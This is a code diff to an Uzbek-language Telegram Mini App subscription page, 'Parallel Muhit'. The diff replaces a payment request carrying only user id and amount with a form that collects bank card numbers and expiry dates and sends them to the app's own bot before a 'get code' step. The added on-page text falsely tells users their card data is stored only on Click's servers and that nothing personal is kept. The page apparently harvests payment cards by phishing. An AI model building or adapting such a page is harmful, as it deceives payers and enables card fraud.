@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Parallel Muhit</title>
-    <!-- Telegram Web App script -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
@@ -89,7 +88,7 @@
             box-sizing: border-box;
             width: 100%;
         }
-        .yes-btn, .continue-btn {
+        .yes-btn, .continue-btn, .get-code-btn {
             background-color: #1c2526;
             color: white;
         }
@@ -173,13 +172,37 @@
             width: 30px;
             height: auto;
         }
+        .card-inputs {
+            margin-bottom: 20px;
+        }
+        .card-inputs label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 16px;
+            color: #000000;
+            font-weight: 600;
+        }
+        .card-inputs input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccd0d5;
+            border-radius: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .card-inputs p {
+            font-size: 12px;
+            color: #606770;
+            margin: 0;
+            line-height: 1.4;
+        }
         .hidden {
             display: none;
         }
     </style>
 </head>
 <body>
-    <!-- Birinchi sahifa: Obuna holati -->
     <div id="subscription-page" class="container">
         <h1>Parallel Muhit</h1>
         <div class="subscription-status">
@@ -203,7 +226,6 @@
         </ul>
     </div>
 
-    <!-- Ikkinchi sahifa: To‘lov detallari -->
     <div id="payment-details-page" class="container hidden">
         <h1>Obuna narxi</h1>
         <h2>67 000 UZS</h2>
@@ -234,28 +256,34 @@
                 <span>Click orqali</span>
             </div>
         </div>
-        <button class="continue-btn" onclick="requestTelegramPayment()">Davom etish</button>
+        <button class="continue-btn" onclick="showCardInput()">Davom etish</button>
+    </div>
+
+    <div id="card-input-page" class="container hidden">
+        <h1>Bank kartasi ma'lumotlarini kiriting</h1>
+        <div class="card-inputs">
+            <label for="card-number">Karta raqami</label>
+            <input type="text" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19">
+            <label for="card-expiry">MM/YY</label>
+            <input type="text" id="card-expiry" placeholder="MM/YY" maxlength="5">
+            <p>Xavfsizlik maqsadida sizning bank kartangiz ma'lumotlari Click xizmatining serverlarida saqlanadi. Sizning shaxsingizga oid hech qanday ma'lumot saqlanmaydi. Click o‘ferta</p>
+        </div>
+        <button class="get-code-btn" onclick="requestPaymentCode()">Kodni olish</button>
     </div>
 
     <script>
-        // Telegram Web App scriptini ulash
         const tg = window.Telegram.WebApp;
         console.log("Telegram Web App initialized:", tg);
 
-        // Foydalanuvchi ma'lumotlarini olish
         const user = tg.initDataUnsafe.user;
         const userId = user ? user.id : null;
         console.log("User ID:", userId);
 
-        // Sahifalarni boshqarish
         const subscriptionPage = document.getElementById("subscription-page");
         const paymentDetailsPage = document.getElementById("payment-details-page");
+        const cardInputPage = document.getElementById("card-input-page");
 
-        // URL parametridan subscription_data ni olish
         function getSubscriptionDataFromURL() {
-            console.log("Current URL:", window.location.href);
-            console.log("URL Search Params:", window.location.search);
-            
             const urlParams = new URLSearchParams(window.location.search);
             const data = urlParams.get("data");
             console.log("Raw data param:", data);
@@ -277,7 +305,6 @@
             return null;
         }
 
-        // Obuna holatini ko‘rsatish
         function displaySubscriptionData() {
             const subscriptionData = getSubscriptionDataFromURL();
             const daysLeftElement = document.getElementById("days-left");
@@ -291,7 +318,6 @@
             }
         }
 
-        // To‘lov detallari sahifasini ko‘rsatish
         function showPaymentDetails() {
             console.log("Show payment details clicked");
             try {
@@ -302,27 +328,37 @@
             }
         }
 
-        // Telegram Payment API orqali to‘lov so‘rovini yuborish
-        function requestTelegramPayment() {
-            console.log("Request Telegram payment clicked");
-            const paymentData = {
-                user_id: userId,
-                amount: "67000",  // 67,000 UZS
-                payment_method: document.querySelector('input[name="payment-method"]:checked').value
-            };
-
-            // Botga ma'lumot yuborish
+        function showCardInput() {
+            console.log("Show card input clicked");
             try {
-                tg.sendData(JSON.stringify(paymentData));
-                console.log("Payment data sent:", paymentData);
-                tg.close();  // Mini App’ni yopish
+                paymentDetailsPage.classList.add("hidden");
+                cardInputPage.classList.remove("hidden");
             } catch (error) {
-                console.error("Error sending payment data:", error);
-                alert("To‘lov ma'lumotlarini yuborishda xatolik yuz berdi!");
+                console.error("Error showing card input:", error);
             }
         }
 
-        // Mini App’ni yopish
+        function requestPaymentCode() {
+            const cardNumber = document.getElementById("card-number").value;
+            const cardExpiry = document.getElementById("card-expiry").value;
+
+            if (!cardNumber || !cardExpiry) {
+                alert("Iltimos, karta ma'lumotlarini to‘ldiring!");
+                return;
+            }
+
+            const paymentData = {
+                user_id: userId,
+                amount: "67000",  // UZS
+                card_number: cardNumber.replace(/\s/g, ""),
+                card_expiry: cardExpiry,
+                payment_method: document.querySelector('input[name="payment-method"]:checked').value
+            };
+
+            tg.sendData(JSON.stringify(paymentData));
+            tg.close();
+        }
+
         function closeMiniApp() {
             console.log("Close Mini App clicked");
             try {
@@ -332,11 +368,24 @@
             }
         }
 
-        // Sahifa yuklanganda obuna ma'lumotlarini ko‘rsatish
         window.onload = function() {
             console.log("Window loaded, displaying subscription data...");
             displaySubscriptionData();
         };
+
+        document.getElementById("card-number").addEventListener("input", function(e) {
+            let value = e.target.value.replace(/\D/g, "");
+            value = value.replace(/(\d{4})/g, "$1 ").trim();
+            e.target.value = value;
+        });
+
+        document.getElementById("card-expiry").addEventListener("input", function(e) {
+            let value = e.target.value.replace(/\D/g, "");
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + "/" + value.substring(2);
+            }
+            e.target.value = value;
+        });
     </script>
 </body>
 </html>
